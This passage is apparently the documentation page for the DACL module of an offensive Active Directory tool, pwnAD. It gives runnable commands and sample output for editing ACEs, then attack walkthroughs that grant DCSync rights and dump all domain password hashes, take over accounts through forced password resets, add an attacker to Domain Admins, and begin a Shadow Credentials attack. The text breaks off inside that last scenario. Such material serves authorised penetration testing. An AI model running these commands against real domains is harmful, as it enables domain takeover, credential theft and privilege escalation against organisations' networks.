+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="dacl-discretionary-access-control-lists">DACL (Discretionary Access Control Lists)</h1>
+<p>The <code>dacl</code> module allows manipulation of Access Control Entries (ACEs) on Active Directory objects. Based on <a href="https://github.com/fortra/impacket/blob/master/examples/dacledit.py">dacledit.py</a> from Impacket.</p>
+<h2 id="overview">Overview</h2>
+<p>DACLs (Discretionary Access Control Lists) define who can access AD objects and what actions they can perform. The <code>dacl</code> module enables:</p>
+<ol>
+<li>Reading and displaying ACEs on any object</li>
+<li>Adding new ACEs (ALLOWED or DENIED) with predefined attack rights</li>
+<li>Removing ACEs from objects</li>
+<li>Backing up and restoring DACLs for cleanup</li>
+</ol>
+<h2 id="requirements">Requirements</h2>
+<ul>
+<li><strong>Permissions</strong>: Read access to <code>nTSecurityDescriptor</code> (for reading), WriteDACL on target (for writing)</li>
+<li><strong>Domain</strong>: Any AD DS domain functional level</li>
+</ul>
+<h2 id="usage">Usage</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="w"> </span>options<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>&lt;subcommand&gt;<span class="w"> </span><span class="o">[</span>arguments<span class="o">]</span>
+</code></pre></div>
+<h2 id="subcommands">Subcommands</h2>
+<table>
+<thead>
+<tr>
+<th>Subcommand</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>read</code></td>
+<td>Read and display the DACL of an object</td>
+</tr>
+<tr>
+<td><code>write</code></td>
+<td>Add an ACE to the DACL</td>
+</tr>
+<tr>
+<td><code>remove</code></td>
+<td>Remove ACEs from the DACL</td>
+</tr>
+<tr>
+<td><code>backup</code></td>
+<td>Backup the DACL to a JSON file</td>
+</tr>
+<tr>
+<td><code>restore</code></td>
+<td>Restore the DACL from a backup file</td>
+</tr>
+</tbody>
+</table>
+<h2 id="available-rights">Available Rights</h2>
+<p>The following predefined rights are available for <code>write</code> and <code>remove</code> operations:</p>
+<table>
+<thead>
+<tr>
+<th>Right</th>
+<th>Description</th>
+<th>Attack Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>FullControl</code></td>
+<td>Full control over object</td>
+<td>Complete object takeover</td>
+</tr>
+<tr>
+<td><code>GenericAll</code></td>
+<td>Generic all rights</td>
+<td>Complete object takeover</td>
+</tr>
+<tr>
+<td><code>GenericWrite</code></td>
+<td>Generic write rights</td>
+<td>Modify any attribute</td>
+</tr>
+<tr>
+<td><code>WriteDacl</code></td>
+<td>Modify DACL</td>
+<td>Grant yourself more permissions</td>
+</tr>
+<tr>
+<td><code>WriteOwner</code></td>
+<td>Modify owner</td>
+<td>Take ownership of object</td>
+</tr>
+<tr>
+<td><code>AllExtendedRights</code></td>
+<td>All extended rights</td>
+<td>Multiple attacks (reset pwd, etc.)</td>
+</tr>
+<tr>
+<td><code>DCSync</code></td>
+<td>Replication rights (3 ACEs)</td>
+<td>Extract all domain hashes</td>
+</tr>
+<tr>
+<td><code>ResetPassword</code></td>
+<td>User-Force-Change-Password</td>
+<td>Reset user password</td>
+</tr>
+<tr>
+<td><code>WriteMembers</code></td>
+<td>Write to group members</td>
+<td>Add users to groups</td>
+</tr>
+<tr>
+<td><code>AddMember</code></td>
+<td>Self-Membership</td>
+<td>Add yourself to a group</td>
+</tr>
+<tr>
+<td><code>ReadGMSAPassword</code></td>
+<td>Read msDS-ManagedPassword</td>
+<td>Retrieve gMSA password</td>
+</tr>
+<tr>
+<td><code>ReadLAPSPassword</code></td>
+<td>Read ms-Mcs-AdmPwd</td>
+<td>Retrieve LAPS password</td>
+</tr>
+<tr>
+<td><code>WriteKeyCredentialLink</code></td>
+<td>Write ms-DS-Key-Credential-Link</td>
+<td>Shadow Credentials attack</td>
+</tr>
+<tr>
+<td><code>WriteSPN</code></td>
+<td>Write servicePrincipalName</td>
+<td>Targeted Kerberoasting</td>
+</tr>
+</tbody>
+</table>
+<h2 id="subcommand-details">Subcommand Details</h2>
+<h3 id="read">read</h3>
+<p>Read and display the DACL of an object. Optionally filter by principal.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span><span class="nb">read</span><span class="w"> </span>&lt;target&gt;<span class="w"> </span><span class="o">[</span>--principal<span class="w"> </span>&lt;principal&gt;<span class="o">]</span><span class="w"> </span><span class="o">[</span>--resolve-sids<span class="o">]</span>
+</code></pre></div>
+<p><strong>Arguments:</strong>
+- <code>target</code>: Target object (sAMAccountName, SID, or DN)
+- <code>--principal</code>: Filter ACEs by this principal
+- <code>--resolve-sids</code>: Resolve SIDs to names</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span><span class="nb">read</span><span class="w"> </span>targetuser
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DACL<span class="w"> </span><span class="k">for</span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>targetuser,CN<span class="o">=</span>Users,DC<span class="o">=</span>domain,DC<span class="o">=</span><span class="nb">local</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>--------------------------------------------------------------------------------
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w">   </span>ACE<span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>info
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>ACE<span class="w"> </span>Type<span class="w">                  </span>:<span class="w"> </span>ACCESS_ALLOWED_ACE
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>ACE<span class="w"> </span>flags<span class="w">                 </span>:<span class="w"> </span>None
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Access<span class="w"> </span>mask<span class="w">               </span>:<span class="w"> </span>FullControl
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Trustee<span class="w"> </span><span class="o">(</span>SID<span class="o">)</span><span class="w">             </span>:<span class="w"> </span>Domain<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>S-1-5-21-...-512<span class="o">)</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w">   </span>ACE<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>info
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>ACE<span class="w"> </span>Type<span class="w">                  </span>:<span class="w"> </span>ACCESS_ALLOWED_OBJECT_ACE
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>ACE<span class="w"> </span>flags<span class="w">                 </span>:<span class="w"> </span>None
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Access<span class="w"> </span>mask<span class="w">               </span>:<span class="w"> </span>ControlAccess
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Flags<span class="w">                     </span>:<span class="w"> </span>ACE_OBJECT_TYPE_PRESENT
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Object<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="o">(</span>GUID<span class="o">)</span><span class="w">        </span>:<span class="w"> </span>User-Force-Change-Password<span class="w"> </span><span class="o">(</span><span class="m">00299570</span>-246d-11d0-a768-00aa006e0529<span class="o">)</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Trustee<span class="w"> </span><span class="o">(</span>SID<span class="o">)</span><span class="w">             </span>:<span class="w"> </span>helpdesk<span class="w"> </span><span class="o">(</span>S-1-5-21-...-1234<span class="o">)</span>
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Total<span class="w"> </span>ACEs<span class="w"> </span>displayed:<span class="w"> </span><span class="m">2</span>
+</code></pre></div></p>
+<p><strong>Filter by principal:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span><span class="nb">read</span><span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>helpdesk
+</code></pre></div></p>
+<h3 id="write">write</h3>
+<p>Add an ACE to the DACL of an object.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span>&lt;target&gt;<span class="w"> </span>--principal<span class="w"> </span>&lt;principal&gt;<span class="w"> </span>--right<span class="w"> </span>&lt;right&gt;<span class="w"> </span><span class="o">[</span>--ace-type<span class="w"> </span>allowed<span class="p">|</span>denied<span class="o">]</span><span class="w"> </span><span class="o">[</span>--inheritance<span class="o">]</span>
+</code></pre></div>
+<p><strong>Arguments:</strong>
+- <code>target</code>: Target object to modify
+- <code>--principal</code>: Principal to grant/deny rights (sAMAccountName or SID)
+- <code>--right</code>: Right to grant (see Available Rights table)
+- <code>--ace-type</code>: Type of ACE: <code>allowed</code> (default) or <code>denied</code>
+- <code>--inheritance</code>: Set inheritance flags on the ACE</p>
+<p><strong>Example - Grant DCSync:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span><span class="s2">&quot;DC=domain,DC=local&quot;</span><span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>DCSync
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>added<span class="w"> </span><span class="m">3</span><span class="w"> </span>ALLOWED<span class="w"> </span>ACE<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;DCSync&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;attacker&#39;</span><span class="w"> </span>on<span class="w"> </span><span class="s1">&#39;DC=domain,DC=local&#39;</span>
+</code></pre></div></p>
+<p><strong>Example - Grant password reset:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>ResetPassword
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>added<span class="w"> </span><span class="m">1</span><span class="w"> </span>ALLOWED<span class="w"> </span>ACE<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;ResetPassword&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;attacker&#39;</span><span class="w"> </span>on<span class="w"> </span><span class="s1">&#39;targetuser&#39;</span>
+</code></pre></div></p>
+<p><strong>Example - Grant group membership write:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span><span class="s2">&quot;Domain Admins&quot;</span><span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>WriteMembers
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>added<span class="w"> </span><span class="m">1</span><span class="w"> </span>ALLOWED<span class="w"> </span>ACE<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;WriteMembers&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;attacker&#39;</span><span class="w"> </span>on<span class="w"> </span><span class="s1">&#39;Domain Admins&#39;</span>
+</code></pre></div></p>
+<h3 id="remove">remove</h3>
+<p>Remove ACEs from the DACL of an object.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span>&lt;target&gt;<span class="w"> </span>--principal<span class="w"> </span>&lt;principal&gt;<span class="w"> </span><span class="o">[</span>--right<span class="w"> </span>&lt;right&gt;<span class="o">]</span><span class="w"> </span><span class="o">[</span>--ace-type<span class="w"> </span>allowed<span class="p">|</span>denied<span class="o">]</span>
+</code></pre></div>
+<p><strong>Arguments:</strong>
+- <code>target</code>: Target object
+- <code>--principal</code>: Principal whose ACEs to remove
+- <code>--right</code>: Optional specific right to remove
+- <code>--ace-type</code>: Optional filter by ACE type</p>
+<p><strong>Example - Remove all ACEs for a principal:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>removed<span class="w"> </span><span class="m">2</span><span class="w"> </span>ACE<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;attacker&#39;</span><span class="w"> </span>from<span class="w"> </span><span class="s1">&#39;targetuser&#39;</span>
+</code></pre></div></p>
+<p><strong>Example - Remove specific right:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span><span class="s2">&quot;DC=domain,DC=local&quot;</span><span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>DCSync
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>removed<span class="w"> </span><span class="m">3</span><span class="w"> </span>ACE<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;attacker&#39;</span><span class="w"> </span>from<span class="w"> </span><span class="s1">&#39;DC=domain,DC=local&#39;</span>
+</code></pre></div></p>
+<h3 id="backup">backup</h3>
+<p>Backup the DACL of an object to a JSON file for later restoration.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>backup<span class="w"> </span>&lt;target&gt;<span class="w"> </span><span class="o">[</span>-o<span class="w"> </span>output.json<span class="o">]</span>
+</code></pre></div>
+<p><strong>Arguments:</strong>
+- <code>target</code>: Target object to backup
+- <code>-o, --output</code>: Output file path (default: <code>&lt;target&gt;_dacl_backup.json</code>)</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span>backup<span class="w"> </span>targetuser
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DACL<span class="w"> </span>backed<span class="w"> </span>up<span class="w"> </span>successfully<span class="w"> </span>to:<span class="w"> </span>targetuser_dacl_backup.json
+</code></pre></div></p>
+<p>The backup file contains:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">{</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span><span class="nt">&quot;target_dn&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;CN=targetuser,CN=Users,DC=domain,DC=local&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span><span class="nt">&quot;security_descriptor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0100...&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">  </span><span class="nt">&quot;backup_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2025-01-26 14:30:00&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">  </span><span class="nt">&quot;domain&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;domain.local&quot;</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="p">}</span>
+</code></pre></div></p>
+<h3 id="restore">restore</h3>
+<p>Restore the DACL of an object from a backup file.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>restore<span class="w"> </span>&lt;backup_file&gt;
+</code></pre></div>
+<p><strong>Arguments:</strong>
+- <code>backup_file</code>: Path to the backup JSON file</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>pwnAD<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass!&#39;</span><span class="w"> </span>dacl<span class="w"> </span>restore<span class="w"> </span>targetuser_dacl_backup.json
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DACL<span class="w"> </span>restored<span class="w"> </span>successfully<span class="w"> </span><span class="k">for</span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>targetuser,CN<span class="o">=</span>Users,DC<span class="o">=</span>domain,DC<span class="o">=</span><span class="nb">local</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Backup<span class="w"> </span>was<span class="w"> </span>created<span class="w"> </span>at:<span class="w"> </span><span class="m">2025</span>-01-26<span class="w"> </span><span class="m">14</span>:30:00
+</code></pre></div></p>
+<h2 id="attack-scenarios">Attack Scenarios</h2>
+<h3 id="scenario-1-dcsync-attack">Scenario 1: DCSync Attack</h3>
+<p>Grant replication rights to extract all domain password hashes:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Backup before modification (good practice)</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>backup<span class="w"> </span><span class="s2">&quot;DC=domain,DC=local&quot;</span><span class="w"> </span>-o<span class="w"> </span>domain_dacl_backup.json
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># Grant DCSync rights</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span><span class="s2">&quot;DC=domain,DC=local&quot;</span><span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>DCSync
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="c1"># Perform DCSync</span>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>secretsdump.py<span class="w"> </span>domain.local/attacker:<span class="s1">&#39;Pass!&#39;</span>@192.168.1.10<span class="w"> </span>-just-dc
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="c1"># Cleanup</span>
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span><span class="s2">&quot;DC=domain,DC=local&quot;</span><span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>DCSync
+</code></pre></div>
+<h3 id="scenario-2-password-reset-chain">Scenario 2: Password Reset Chain</h3>
+<p>Take over an account by resetting its password:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Grant ResetPassword right</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>ResetPassword
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c1"># Reset the password</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>modify<span class="w"> </span>user<span class="w"> </span>targetuser<span class="w"> </span>--new-password<span class="w"> </span><span class="s1">&#39;NewP@ss123!&#39;</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="c1"># Cleanup</span>
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>ResetPassword
+</code></pre></div>
+<h3 id="scenario-3-group-membership-abuse">Scenario 3: Group Membership Abuse</h3>
+<p>Add yourself to a privileged group:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Grant WriteMembers on the group</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span><span class="s2">&quot;Domain Admins&quot;</span><span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>WriteMembers
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Add yourself to the group</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>add<span class="w"> </span>member<span class="w"> </span><span class="s2">&quot;Domain Admins&quot;</span><span class="w"> </span>attacker
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c1"># Cleanup (remove your ACE, but you&#39;re still in the group!)</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>remove<span class="w"> </span><span class="s2">&quot;Domain Admins&quot;</span><span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>WriteMembers
+</code></pre></div>
+<h3 id="scenario-4-shadow-credentials-via-dacl">Scenario 4: Shadow Credentials via DACL</h3>
+<p>Grant rights to perform Shadow Credentials attack:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Grant WriteKeyCredentialLink</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>dacl<span class="w"> </span>write<span class="w"> </span>targetuser<span class="w"> </span>--principal<span class="w"> </span>attacker<span class="w"> </span>--right<span class="w"> </span>WriteKeyCredentialLink
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># Perform Shadow Credentials attack</span>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>pwnAD<span class="w"> </span><span class="o">[</span>auth<span class="o">]</span><span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>targetuser
